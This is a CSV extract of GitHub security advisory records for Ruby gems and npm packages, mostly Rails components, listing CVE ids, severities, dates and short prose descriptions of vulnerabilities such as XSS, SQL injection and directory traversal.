1537,16045,ejs,GHSA-6x77-rpqf-j6mw,CVE-2017-1000189,https://github.com/advisories/GHSA-6x77-rpqf-j6mw,high,2018-03-05 18:54:33 UTC,High severity vulnerability that affects ejs,nodejs ejs version older than 2.5.5 is vulnerable to a denial-of-service due to weak input validation in the ejs.renderFile(),npm
1538,16045,ejs,GHSA-hwcf-pp87-7x6p,CVE-2017-1000188,https://github.com/advisories/GHSA-hwcf-pp87-7x6p,moderate,2017-11-30 23:15:05 UTC,Moderate severity vulnerability that affects ejs,nodejs ejs version older than 2.5.5 is vulnerable to a Cross-site-scripting in the ejs.renderFile() resulting in code injection,npm
1539,19291,geminabox,GHSA-653m-r33x-39ff,CVE-2017-16792,https://github.com/advisories/GHSA-653m-r33x-39ff,moderate,2017-11-29 23:20:14 UTC,Moderate severity vulnerability that affects geminabox,"Stored cross-site scripting (XSS) vulnerability in ""geminabox"" (Gem in a Box) before 0.13.10 allows attackers to inject arbitrary web script via the ""homepage"" value of a "".gemspec"" file, related to views/gem.erb and views/index.erb.",rubygems
1540,18895,yajl-ruby,GHSA-wwh7-4jw9-33x6,CVE-2017-16516,https://github.com/advisories/GHSA-wwh7-4jw9-33x6,high,2017-11-28 22:44:42 UTC,High severity vulnerability that affects yajl-ruby,"In the yajl-ruby gem 1.3.0 for Ruby, when a crafted JSON file is supplied to Yajl::Parser.new.parse, the whole ruby process crashes with a SIGABRT in the yajl_string_decode function in yajl_encode.c. This results in the whole ruby process terminating and potentially a denial of service.",rubygems
1541,19163,ox,GHSA-pjj4-w39g-pw54,CVE-2017-15928,https://github.com/advisories/GHSA-pjj4-w39g-pw54,high,2017-11-21 18:26:40 UTC,Ox gem crashes due to a crafted input,"In the Ox gem 2.8.0 for Ruby, the process crashes with a segmentation fault when a crafted input is supplied to parse_obj. NOTE: the vendor has stated ""Ox should handle the error more gracefully"" but has not confirmed a security implication.",rubygems
1542,27851,gollum,GHSA-q97v-764g-r2rp,CVE-2014-9489,https://github.com/advisories/GHSA-q97v-764g-r2rp,high,2017-11-16 01:47:37 UTC,High severity vulnerability that affects gollum and gollum-lib,"The gollum-grit_adapter Ruby gem dependency in gollum before 3.1.1 and the gollum-lib gem dependency in gollum-lib before 4.0.1 when the string ""master"" is in any of the wiki documents, allows remote authenticated users to execute arbitrary code via the -O or --open-files-in-pager flags.",rubygems
1543,18821,rubocop,GHSA-wmjf-jpjj-9f3j,CVE-2017-8418,https://github.com/advisories/GHSA-wmjf-jpjj-9f3j,low,2017-11-15 20:39:47 UTC,Low severity vulnerability that affects rubocop,"RuboCop 0.48.1 and earlier does not use /tmp in safe way, allowing local users to exploit this to tamper with cache files belonging to other users.",rubygems
1544,19282,puppet,GHSA-574q-fxfj-wv6h,CVE-2013-1655,https://github.com/advisories/GHSA-574q-fxfj-wv6h,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects puppet,"Puppet 2.7.x before 2.7.21 and 3.1.x before 3.1.1, when running Ruby 1.9.3 or later, allows remote attackers to execute arbitrary code via vectors related to ""serialized attributes.""",rubygems
1545,18887,rubyzip,GHSA-gcqq-w6gr-h9j9,CVE-2017-5946,https://github.com/advisories/GHSA-gcqq-w6gr-h9j9,critical,2017-10-24 18:33:35 UTC,Directory traversal vulnerability in RubyZip,"The Zip::File component in the rubyzip gem before 1.2.1 for Ruby has a directory traversal vulnerability. If a site allows uploading of .zip files, an attacker can upload a malicious file that uses ""../"" pathname substrings to write arbitrary files to the filesystem.",rubygems
1546,18816,rails,GHSA-rvpq-5xqx-pfpp,CVE-2006-4111,https://github.com/advisories/GHSA-rvpq-5xqx-pfpp,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects rails,"Ruby on Rails before 1.1.5 allows remote attackers to execute Ruby code with ""severe"" or ""serious"" impact via a File Upload request with an HTTP header that modifies the LOAD_PATH variable, a different vulnerability than CVE-2006-4112.",rubygems
1547,18816,rails,GHSA-9wrq-xvmp-xjc8,CVE-2006-4112,https://github.com/advisories/GHSA-9wrq-xvmp-xjc8,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects rails.,"Unspecified vulnerability in the ""dependency resolution mechanism"" in Ruby on Rails 1.1.0 through 1.1.5 allows remote attackers to execute arbitrary Ruby code via a URL that is not properly handled in the routing code, which leads to a denial of service (application hang) or ""data loss,"" a different vulnerability than CVE-2006-4111.",rubygems
1548,18816,rails,GHSA-gm25-fpmr-43fj,CVE-2007-3227,https://github.com/advisories/GHSA-gm25-fpmr-43fj,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,Cross-site scripting (XSS) vulnerability in the to_json (ActiveRecord::Base#to_json) function in Ruby on Rails before edge 9606 allows remote attackers to inject arbitrary web script via the input values.,rubygems
1549,18816,rails,GHSA-fjfg-q662-gm6j,CVE-2007-5379,https://github.com/advisories/GHSA-fjfg-q662-gm6j,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Rails before 1.2.4, as used for Ruby on Rails, allows remote attackers and ActiveResource servers to determine the existence of arbitrary files and read arbitrary XML files via the Hash.from_xml (Hash#from_xml) method, which uses XmlSimple (XML::Simple) unsafely, as demonstrated by reading passwords from the Pidgin (Gaim) .purple/accounts.xml file.",rubygems
1550,18816,rails,GHSA-jwhv-rgqc-fqj5,CVE-2007-5380,https://github.com/advisories/GHSA-jwhv-rgqc-fqj5,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Session fixation vulnerability in Rails before 1.2.4, as used for Ruby on Rails, allows remote attackers to hijack web sessions via unspecified vectors related to ""URL-based sessions.""",rubygems
1551,18816,rails,GHSA-p4c6-77gc-694x,CVE-2007-6077,https://github.com/advisories/GHSA-p4c6-77gc-694x,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"The session fixation protection mechanism in cgi_process.rb in Rails 1.2.4, as used in Ruby on Rails, removes the :cookie_only attribute from the DEFAULT_SESSION_OPTIONS constant, which effectively causes cookie_only to be applied only to the first instantiation of CgiRequest, which allows remote attackers to conduct session fixation attacks.  NOTE: this is due to an incomplete fix for CVE-2007-5380.",rubygems
1552,19317,gtk2,GHSA-xgj6-pgrm-x4r2,CVE-2007-6183,https://github.com/advisories/GHSA-xgj6-pgrm-x4r2,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects gtk2,"Format string vulnerability in the mdiag_initialize function in gtk/src/rbgtkmessagedialog.c in Ruby-GNOME 2 (aka Ruby/Gnome2) 0.16.0, and SVN versions before 20071127, allows context-dependent attackers to execute arbitrary code via format string specifiers in the message parameter.",rubygems
1553,18816,rails,GHSA-xf96-32q2-9rw2,CVE-2008-4094,https://github.com/advisories/GHSA-xf96-32q2-9rw2,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects rails,"Multiple SQL injection vulnerabilities in Ruby on Rails before 2.1.1 allow remote attackers to execute arbitrary SQL commands via the (1) :limit and (2) :offset parameters, related to ActiveRecord, ActiveSupport, ActiveResource, ActionPack, and ActionMailer.",rubygems
1554,18816,rails,GHSA-jmgf-p46x-982h,CVE-2008-5189,https://github.com/advisories/GHSA-jmgf-p46x-982h,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,CRLF injection vulnerability in Ruby on Rails before 2.0.5 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a crafted URL to the redirect_to function.,rubygems
1555,18816,rails,GHSA-8fqx-7pv4-3jwm,CVE-2008-7248,https://github.com/advisories/GHSA-8fqx-7pv4-3jwm,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Ruby on Rails 2.1 before 2.1.3 and 2.2.x before 2.2.2 does not verify tokens for requests with certain content types, which allows remote attackers to bypass cross-site request forgery (CSRF) protection for requests to applications that rely on this protection, as demonstrated using text/plain.",rubygems
1556,18816,rails,GHSA-rxq3-gm4p-5fj4,CVE-2009-2422,https://github.com/advisories/GHSA-rxq3-gm4p-5fj4,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects rails,"The example code for the digest authentication functionality (http_authentication.rb) in Ruby on Rails before 2.3.3 defines an authenticate_or_request_with_http_digest block that returns nil instead of false when the user does not exist, which allows context-dependent attackers to bypass authentication for applications that are derived from this example by sending an invalid username without a password.",rubygems
1557,18816,rails,GHSA-8qrh-h9m2-5fvf,CVE-2009-3009,https://github.com/advisories/GHSA-8qrh-h9m2-5fvf,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Cross-site scripting (XSS) vulnerability in Ruby on Rails 2.x before 2.2.3, and 2.3.x before 2.3.4, allows remote attackers to inject arbitrary web script or HTML by placing malformed Unicode strings into a form helper.",rubygems
1558,18816,rails,GHSA-fg9w-g6m4-557j,CVE-2009-3086,https://github.com/advisories/GHSA-fg9w-g6m4-557j,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"A certain algorithm in Ruby on Rails 2.1.0 through 2.2.2, and 2.3.x before 2.3.4, leaks information about the complexity of message-digest signature verification in the cookie store, which might allow remote attackers to forge a digest via multiple attempts.",rubygems
1559,18900,thin,GHSA-j24p-r6wx-r79w,CVE-2009-3287,https://github.com/advisories/GHSA-j24p-r6wx-r79w,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects thin,"lib/thin/connection.rb in Thin web server before 1.2.4 relies on the X-Forwarded-For header to determine the IP address of the client, which allows remote attackers to spoof the IP address and hide activities via a modified X-Forwarded-For header.",rubygems
1560,18816,rails,GHSA-9p3v-wf2w-v29c,CVE-2009-4214,https://github.com/advisories/GHSA-9p3v-wf2w-v29c,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Cross-site scripting (XSS) vulnerability in the strip_tags function in Ruby on Rails before 2.2.s, and 2.3.x before 2.3.5, allows remote attackers to inject arbitrary web script or HTML via vectors involving non-printing ASCII characters, related to HTML::Tokenizer and actionpack/lib/action_controller/vendor/html-scanner/html/node.rb.",rubygems
1561,19444,webrick,GHSA-6mq2-37j5-w6r6,CVE-2009-4492,https://github.com/advisories/GHSA-6mq2-37j5-w6r6,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects webrick,"WEBrick 1.3.1 in Ruby 1.8.6 through patchlevel 383, 1.8.7 through patchlevel 248, 1.8.8dev, 1.9.1 through patchlevel 376, and 1.9.2dev writes data to a log file without sanitizing non-printable characters, which might allow remote attackers to modify a window's title, or possibly execute arbitrary commands or overwrite files, via an HTTP request containing an escape sequence for a terminal emulator.",rubygems
1562,18816,rails,GHSA-gjxw-5w2q-7grf,CVE-2010-3933,https://github.com/advisories/GHSA-gjxw-5w2q-7grf,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Ruby on Rails 2.3.9 and 3.0.0 does not properly handle nested attributes, which allows remote attackers to modify arbitrary records by changing the names of parameters for form inputs.",rubygems
1563,17417,jquery-ui,GHSA-wcm2-9c89-wmfm,CVE-2010-5312,https://github.com/advisories/GHSA-wcm2-9c89-wmfm,moderate,2017-10-24 18:33:38 UTC,Cross-site Scripting in jquery-ui,Cross-site scripting (XSS) vulnerability in jquery.ui.dialog.js in the Dialog widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title option.,npm
1564,18816,rails,GHSA-75w6-p6mg-vh8j,CVE-2011-0446,https://github.com/advisories/GHSA-75w6-p6mg-vh8j,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Multiple cross-site scripting (XSS) vulnerabilities in the mail_to helper in Ruby on Rails before 2.3.11, and 3.x before 3.0.4, when javascript encoding is used, allow remote attackers to inject arbitrary web script or HTML via a crafted (1) name or (2) email value.",rubygems
1565,18816,rails,GHSA-24fg-p96v-hxh8,CVE-2011-0447,https://github.com/advisories/GHSA-24fg-p96v-hxh8,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Ruby on Rails 2.1.x, 2.2.x, and 2.3.x before 2.3.11, and 3.x before 3.0.4, does not properly validate HTTP requests that contain an X-Requested-With header, which makes it easier for remote attackers to conduct cross-site request forgery (CSRF) attacks via forged (1) AJAX or (2) API requests that leverage ""combinations of browser plugins and HTTP redirects,"" a related issue to CVE-2011-0696.",rubygems
1566,18937,mail,GHSA-cpjc-p7fc-j9xh,CVE-2011-0739,https://github.com/advisories/GHSA-cpjc-p7fc-j9xh,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects mail,The deliver function in the sendmail delivery agent (lib/mail/network/delivery_methods/sendmail.rb) in Ruby Mail gem 2.2.14 and earlier allows remote attackers to execute arbitrary commands via shell metacharacters in an e-mail address.,rubygems
1567,18920,sqlite3-ruby,GHSA-6x46-7rrv-m4h8,CVE-2011-0995,https://github.com/advisories/GHSA-6x46-7rrv-m4h8,low,2017-10-24 18:33:38 UTC,Low severity vulnerability that affects sqlite3-ruby,"The sqlite3-ruby gem in the rubygem-sqlite3 package before 1.2.4-0.5.1 in SUSE Linux Enterprise (SLE) 11 SP1 uses weak permissions for unspecified files, which allows local users to gain privileges via unknown vectors.",rubygems
1568,18816,rails,GHSA-v9v4-7jp6-8c73,CVE-2011-2197,https://github.com/advisories/GHSA-v9v4-7jp6-8c73,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"The cross-site scripting (XSS) prevention feature in Ruby on Rails 2.x before 2.3.12, 3.0.x before 3.0.8, and 3.1.x before 3.1.0.rc2 does not properly handle mutation of safe buffers, which makes it easier for remote attackers to conduct XSS attacks via crafted strings to an application that uses a problematic string method, as demonstrated by the sub method.",rubygems
1569,18865,actionpack,GHSA-r7q2-5gqg-6c7q,CVE-2011-2929,https://github.com/advisories/GHSA-r7q2-5gqg-6c7q,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"The template selection functionality in actionpack/lib/action_view/template/resolver.rb in Ruby on Rails 3.0.x before 3.0.10 and 3.1.x before 3.1.0.rc6 does not properly handle glob characters, which allows remote attackers to render arbitrary views via a crafted URL, related to a ""filter skipping vulnerability.""",rubygems
1570,18828,activerecord,GHSA-h6w6-xmqv-7q78,CVE-2011-2930,https://github.com/advisories/GHSA-h6w6-xmqv-7q78,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects activerecord,"Multiple SQL injection vulnerabilities in the quote_table_name method in the ActiveRecord adapters in activerecord/lib/active_record/connection_adapters/ in Ruby on Rails before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allow remote attackers to execute arbitrary SQL commands via a crafted column name.",rubygems
1571,18865,actionpack,GHSA-v5jg-558j-q67c,CVE-2011-2931,https://github.com/advisories/GHSA-v5jg-558j-q67c,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"Cross-site scripting (XSS) vulnerability in the strip_tags helper in actionpack/lib/action_controller/vendor/html-scanner/html/node.rb in Ruby on Rails before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allows remote attackers to inject arbitrary web script or HTML via a tag with an invalid name.",rubygems
1572,18817,activesupport,GHSA-9fh3-vh3h-q4g3,CVE-2011-2932,https://github.com/advisories/GHSA-9fh3-vh3h-q4g3,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects activesupport,"Cross-site scripting (XSS) vulnerability in activesupport/lib/active_support/core_ext/string/output_safety.rb in Ruby on Rails 2.x before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allows remote attackers to inject arbitrary web script or HTML via a malformed Unicode string, related to a ""UTF-8 escaping vulnerability.""",rubygems
1573,18865,actionpack,GHSA-fcqf-h4h4-695m,CVE-2011-3186,https://github.com/advisories/GHSA-fcqf-h4h4-695m,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,CRLF injection vulnerability in actionpack/lib/action_controller/response.rb in Ruby on Rails 2.3.x before 2.3.13 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via the Content-Type header.,rubygems
1574,18865,actionpack,GHSA-3vfw-7rcp-3xgm,CVE-2011-3187,https://github.com/advisories/GHSA-3vfw-7rcp-3xgm,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"The to_s method in actionpack/lib/action_dispatch/middleware/remote_ip.rb in Ruby on Rails 3.0.5 does not validate the X-Forwarded-For header in requests from IP addresses on a Class C network, which might allow remote attackers to inject arbitrary text into log files or bypass intended address parsing via a crafted header.",rubygems
1575,18816,rails,GHSA-xxr8-833v-c7wc,CVE-2011-4319,https://github.com/advisories/GHSA-xxr8-833v-c7wc,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects rails,"Cross-site scripting (XSS) vulnerability in the i18n translations helper method in Ruby on Rails 3.0.x before 3.0.11 and 3.1.x before 3.1.2, and the rails_xss plugin in Ruby on Rails 2.3.x, allows remote attackers to inject arbitrary web script or HTML via vectors related to a translations string whose name ends with an ""html"" substring.",rubygems
1576,18817,activesupport,GHSA-qv8p-v9qw-wc7g,CVE-2012-1098,https://github.com/advisories/GHSA-qv8p-v9qw-wc7g,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects activesupport,"Cross-site scripting (XSS) vulnerability in Ruby on Rails 3.0.x before 3.0.12, 3.1.x before 3.1.4, and 3.2.x before 3.2.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving a SafeBuffer object that is manipulated through certain methods.",rubygems
1577,18865,actionpack,GHSA-2xjj-5x6h-8vmf,CVE-2012-1099,https://github.com/advisories/GHSA-2xjj-5x6h-8vmf,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/form_options_helper.rb in the select helper in Ruby on Rails 3.0.x before 3.0.12, 3.1.x before 3.1.4, and 3.2.x before 3.2.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving certain generation of OPTION elements within SELECT elements.",rubygems
1578,19282,puppet,GHSA-c5qq-g673-5p49,CVE-2012-1989,https://github.com/advisories/GHSA-c5qq-g673-5p49,low,2017-10-24 18:33:38 UTC,Low severity vulnerability that affects puppet,"telnet.rb in Puppet 2.7.x before 2.7.13 and Puppet Enterprise (PE) 1.2.x, 2.0.x, and 2.5.x before 2.5.1 allows local users to overwrite arbitrary files via a symlink attack on the NET::Telnet connection log (/tmp/out.log).",rubygems
1579,18937,mail,GHSA-cj92-c4fj-w9c5,CVE-2012-2139,https://github.com/advisories/GHSA-cj92-c4fj-w9c5,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects mail,Directory traversal vulnerability in lib/mail/network/delivery_methods/file_delivery.rb in the Mail gem before 2.4.4 for Ruby allows remote attackers to read arbitrary files via a .. (dot dot) in the to parameter.,rubygems
1580,18937,mail,GHSA-rp63-jfmw-532w,CVE-2012-2140,https://github.com/advisories/GHSA-rp63-jfmw-532w,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects mail,The Mail gem before 2.4.3 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a (1) sendmail or (2) exim delivery.,rubygems
1581,18865,actionpack,GHSA-hgpp-pp89-4fgf,CVE-2012-2660,https://github.com/advisories/GHSA-hgpp-pp89-4fgf,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain ""[nil]"" values, a related issue to CVE-2012-2694.",rubygems
1582,18828,activerecord,GHSA-fh39-v733-mxfr,CVE-2012-2661,https://github.com/advisories/GHSA-fh39-v733-mxfr,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects activerecord,"The Active Record component in Ruby on Rails 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage unintended recursion, a related issue to CVE-2012-2695.",rubygems
1583,18865,actionpack,GHSA-q34c-48gc-m9g8,CVE-2012-2694,https://github.com/advisories/GHSA-q34c-48gc-m9g8,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain ""['xyz', nil]"" values, a related issue to CVE-2012-2660.",rubygems
1584,18828,activerecord,GHSA-76wq-xw4h-f8wj,CVE-2012-2695,https://github.com/advisories/GHSA-76wq-xw4h-f8wj,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects activerecord,"The Active Record component in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.",rubygems
1585,19282,puppet,GHSA-vxf6-w9mp-95hm,CVE-2012-3408,https://github.com/advisories/GHSA-vxf6-w9mp-95hm,low,2017-10-24 18:33:38 UTC,Low severity vulnerability that affects puppet,"lib/puppet/network/authstore.rb in Puppet before 2.7.18, and Puppet Enterprise before 2.5.2, supports use of IP addresses in certnames without warning of potential risks, which might allow remote attackers to spoof an agent by acquiring a previously used IP address.",rubygems
1586,18865,actionpack,GHSA-92w9-2pqw-rhjj,CVE-2012-3424,https://github.com/advisories/GHSA-92w9-2pqw-rhjj,moderate,2017-10-24 18:33:38 UTC,Moderate severity vulnerability that affects actionpack,"The decode_credentials method in actionpack/lib/action_controller/metal/http_authentication.rb in Ruby on Rails before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a with_http_digest helper method, as demonstrated by the authenticate_or_request_with_http_digest method.",rubygems
1587,18865,actionpack,GHSA-98mf-8f57-64qf,CVE-2012-3463,https://github.com/advisories/GHSA-98mf-8f57-64qf,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/form_tag_helper.rb in Ruby on Rails 3.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via the prompt field to the select_tag helper.",rubygems
1588,18817,activesupport,GHSA-h835-75hw-pj89,CVE-2012-3464,https://github.com/advisories/GHSA-h835-75hw-pj89,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activesupport,"Cross-site scripting (XSS) vulnerability in activesupport/lib/active_support/core_ext/string/output_safety.rb in Ruby on Rails before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.",rubygems
1589,18865,actionpack,GHSA-7g65-ghrg-hpf5,CVE-2012-3465,https://github.com/advisories/GHSA-7g65-ghrg-hpf5,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/sanitize_helper.rb in the strip_tags helper in Ruby on Rails before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.",rubygems
1590,19282,puppet,GHSA-g89m-3wjw-h857,CVE-2012-3865,https://github.com/advisories/GHSA-g89m-3wjw-h857,low,2017-10-24 18:33:37 UTC,Low severity vulnerability that affects puppet,"Directory traversal vulnerability in lib/puppet/reports/store.rb in Puppet before 2.6.17 and 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, when Delete is enabled in auth.conf, allows remote authenticated users to delete arbitrary files on the puppet master server via a .. (dot dot) in a node name.",rubygems
1591,19282,puppet,GHSA-8jxj-9r5f-w3m2,CVE-2012-3866,https://github.com/advisories/GHSA-8jxj-9r5f-w3m2,low,2017-10-24 18:33:37 UTC,Low severity vulnerability that affects puppet,"lib/puppet/defaults.rb in Puppet 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, uses 0644 permissions for last_run_report.yaml, which allows local users to obtain sensitive configuration information by leveraging access to the puppet master server to read this file.",rubygems
1592,19282,puppet,GHSA-q44r-f2hm-v76v,CVE-2012-3867,https://github.com/advisories/GHSA-q44r-f2hm-v76v,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects puppet,"lib/puppet/ssl/certificate_authority.rb in Puppet before 2.6.17 and 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, does not properly restrict the characters in the Common Name field of a Certificate Signing Request (CSR), which makes it easier for user-assisted remote attackers to trick administrators into signing a crafted agent certificate via ANSI control sequences.",rubygems
1593,18839,rack,GHSA-h77x-m5q8-c29h,CVE-2012-6109,https://github.com/advisories/GHSA-h77x-m5q8-c29h,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects rack,"lib/rack/multipart.rb in Rack before 1.1.4, 1.2.x before 1.2.6, 1.3.x before 1.3.7, and 1.4.x before 1.4.2 uses an incorrect regular expression, which allows remote attackers to cause a denial of service (infinite loop) via a crafted Content-Disposion header.",rubygems
1594,18909,omniauth-oauth2,GHSA-fgmx-8h93-26fh,CVE-2012-6134,https://github.com/advisories/GHSA-fgmx-8h93-26fh,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects omniauth-oauth2,Cross-site request forgery (CSRF) vulnerability in the omniauth-oauth2 gem 1.1.1 and earlier for Ruby allows remote attackers to hijack the authentication of users for requests that modify session state.,rubygems
1595,18828,activerecord,GHSA-gh2w-j7cx-2664,CVE-2012-6496,https://github.com/advisories/GHSA-gh2w-j7cx-2664,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects activerecord,"SQL injection vulnerability in the Active Record component in Ruby on Rails before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.",rubygems
1596,17417,jquery-ui,GHSA-qqxp-xp9v-vvx6,CVE-2012-6662,https://github.com/advisories/GHSA-qqxp-xp9v-vvx6,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects jquery-ui,"Cross-site scripting (XSS) vulnerability in the default content option in jquery.ui.tooltip.js in the Tooltip widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title attribute, which is not properly handled in the autocomplete combo box demo.",npm
1597,18828,activerecord,GHSA-gppp-5xc5-wfpx,CVE-2013-0155,https://github.com/advisories/GHSA-gppp-5xc5-wfpx,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activerecord,"Ruby on Rails 3.0.x before 3.0.19, 3.1.x before 3.1.10, and 3.2.x before 3.2.11 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain ""[nil]"" values, a related issue to CVE-2012-2660 and CVE-2012-2694.",rubygems
1598,18865,actionpack,GHSA-jmgw-6vjg-jjwg,CVE-2013-0156,https://github.com/advisories/GHSA-jmgw-6vjg-jjwg,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects actionpack,"active_support/core_ext/hash/conversions.rb in Ruby on Rails before 2.3.15, 3.0.x before 3.0.19, 3.1.x before 3.1.10, and 3.2.x before 3.2.11 does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion.",rubygems
1599,19050,multi_xml,GHSA-pchc-949f-53m5,CVE-2013-0175,https://github.com/advisories/GHSA-pchc-949f-53m5,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects multi_xml,"multi_xml gem 0.5.2 for Ruby, as used in Grape before 0.2.6 and possibly other products, does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",rubygems
1600,18839,rack,GHSA-3pxh-h8hw-mj8w,CVE-2013-0183,https://github.com/advisories/GHSA-3pxh-h8hw-mj8w,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects rack,multipart/parser.rb in Rack 1.3.x before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to cause a denial of service (memory consumption and out-of-memory error) via a long string in a Multipart HTTP packet.,rubygems
1601,18908,devise,GHSA-jxhw-mg8m-2pj8,CVE-2013-0233,https://github.com/advisories/GHSA-jxhw-mg8m-2pj8,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects devise,"Devise gem 2.2.x before 2.2.3, 2.1.x before 2.1.3, 2.0.x before 2.0.5, and 1.5.x before 1.5.4 for Ruby, when using certain databases, does not properly perform type conversion when performing database queries, which might allow remote attackers to cause incorrect results to be returned and bypass security checks via unknown vectors, as demonstrated by resetting passwords of arbitrary accounts.",rubygems
